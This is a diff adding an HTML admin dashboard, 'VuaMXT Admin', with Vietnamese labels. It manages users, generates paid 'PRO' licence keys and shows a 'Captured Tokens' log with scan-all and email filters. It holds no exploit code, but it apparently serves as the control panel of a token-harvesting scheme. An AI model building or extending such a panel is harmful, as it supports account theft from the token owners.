@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login - VuaMXT Admin</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"/>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="dashboard.css"/>
+</head>
+<body>
+    <div class="dot-pattern"></div>
+    <div class="meteors-container">
+        <div class="meteor" style="left: 10%; animation-delay: 0s; animation-duration: 8s;"></div>
+        <div class="meteor" style="left: 30%; animation-delay: 2s; animation-duration: 10s;"></div>
+        <div class="meteor" style="left: 50%; animation-delay: 4s; animation-duration: 7s;"></div>
+        <div class="meteor" style="left: 70%; animation-delay: 1s; animation-duration: 9s;"></div>
+        <div class="meteor" style="left: 90%; animation-delay: 3s; animation-duration: 11s;"></div>
+    </div>
+    
+    <!-- Login Section -->
+    <div id="loginSection">
+        <div class="login-card">
+            <h2><i class="bi bi-shield-lock"></i> ADMIN ACCESS</h2>
+            <form id="loginForm">
+                <input type="password" id="password" class="form-control" placeholder="Mật khẩu quản trị..." required autofocus>
+                <button type="submit">ĐĂNG NHẬP</button>
+                <div id="loginError" class="text-danger mt-3 text-center" style="font-size: 12px; display: none;">Mật khẩu không chính xác!</div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Dashboard Section -->
+    <div id="dashboardSection" style="display: none;">
+        <div class="container-fluid">
+            <div class="d-flex justify-content-between align-items-center mb-4">
+                <h1><i class="bi bi-shield-lock"></i> VuaMXT Admin</h1>
+                <div>
+                    <span class="me-3 text-muted" style="font-size: 12px;">Admin Session: <strong>Active</strong></span>
+                    <button id="logoutBtn" class="btn btn-danger btn-sm"><i class="bi bi-power"></i> Đăng xuất</button>
+                </div>
+            </div>
+
+            <div class="row">
+                <!-- CỘT TRÁI: QUẢN LÝ HỆ THỐNG -->
+                <div class="col-lg-7">
+                    <div class="card-custom">
+                        <h3><i class="bi bi-people"></i> Quản lý Người dùng</h3>
+                        <form id="usersForm">
+                            <input type="hidden" name="table_type" value="users">
+                            <div class="mb-2">
+                                <button type="button" id="bulkDeleteUsers" class="btn btn-danger btn-sm" onclick="return confirm('Xóa các user đã chọn?')"><i class="bi bi-trash"></i> Xóa đã chọn</button>
+                            </div>
+                            <div class="table-responsive">
+                                <table id="usersTable">
+                                    <thead>
+                                        <tr><th><input type="checkbox" id="selectAllUsers"></th><th>Username</th><th>Email</th><th>Gói</th><th>Thao tác</th></tr>
+                                    </thead>
+                                    <tbody id="usersTableBody">
+                                        <!-- Users will be loaded here -->
+                                    </tbody>
+                                </table>
+                            </div>
+                        </form>
+                    </div>
+
+                    <div class="card-custom">
+                        <h3><i class="bi bi-key"></i> Quản lý Key PRO</h3>
+                        <div class="row">
+                            <div class="col-md-4">
+                                <form id="genKeyForm" class="mb-3">
+                                    <label class="d-block mb-1" style="font-size: 11px;">Số lượng:</label>
+                                    <input type="number" name="count" value="5" min="1" style="width:100%" class="mb-2">
+                                    <button type="submit" class="btn btn-success btn-sm w-100"><i class="bi bi-plus-lg"></i> Tạo Key Mới</button>
+                                </form>
+                            </div>
+                            <div class="col-md-8">
+                                <form id="keysForm">
+                                    <input type="hidden" name="table_type" value="keys_store">
+                                    <div class="table-responsive" style="max-height: 300px; overflow-y: auto;">
+                                        <table id="keysTable">
+                                            <thead>
+                                                <tr><th><input type="checkbox" id="selectAllKeys"></th><th>Mã Key</th><th>Trạng thái</th></tr>
+                                            </thead>
+                                            <tbody id="keysTableBody">
+                                                <!-- Keys will be loaded here -->
+                                            </tbody>
+                                        </table>
+                                    </div>
+                                    <button type="button" id="bulkDeleteKeys" class="btn btn-danger btn-sm mt-2" onclick="return confirm('Xóa các key đã chọn?')"><i class="bi bi-trash"></i> Xóa Key đã chọn</button>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- CỘT PHẢI: LOG TOKEN THU THẬP -->
+                <div class="col-lg-5">
+                    <div class="card-custom">
+                        <div class="d-flex justify-content-between align-items-center mb-3">
+                            <h3><i class="bi bi-database-down"></i> Captured Tokens</h3>
+                            <div class="d-flex gap-2">
+                                <button id="scanAllBtn" class="btn btn-info btn-sm"><i class="bi bi-search"></i> Quét Hết</button>
+                                <button id="clearTokensBtn" class="btn btn-danger btn-sm" onclick="return confirm('Xóa sạch log token?')"><i class="bi bi-x-circle"></i> Xóa Log</button>
+                            </div>
+                        </div>
+
+                        <div class="filter-bar">
+                            <button class="filter-btn active" data-filter="all">Tất cả (<span id="tokenCount">0</span>)</button>
+                            <button class="filter-btn" data-filter="has-email">Có Email</button>
+                            <button class="filter-btn" data-filter="no-email">Không Email</button>
+                            <button class="filter-btn" data-filter="pending">Đang chờ (15d)</button>
+                        </div>
+
+                        <div class="accordion" id="tokenAccordion" style="max-height: 700px; overflow-y: auto; padding-right: 5px;">
+                            <div id="tokensList">
+                                <!-- Tokens will be loaded here -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Generated Keys Modal -->
+    <div class="modal" id="keysModal" style="display: none;">
+        <h3><i class="bi bi-check2-all"></i> Keys Đã Tạo</h3>
+        <textarea id="keys_area" readonly style="width:100%; height:120px; font-family: var(--mono); font-size: 12px;"></textarea><br><br>
+        <div class="d-flex gap-2">
+            <button class="btn btn-success btn-sm flex-grow-1" onclick="copyKeys()"><i class="bi bi-clipboard"></i> Sao chép tất cả</button>
+            <button class="btn btn-secondary btn-sm" onclick="document.getElementById('keysModal').style.display='none'">Đóng</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
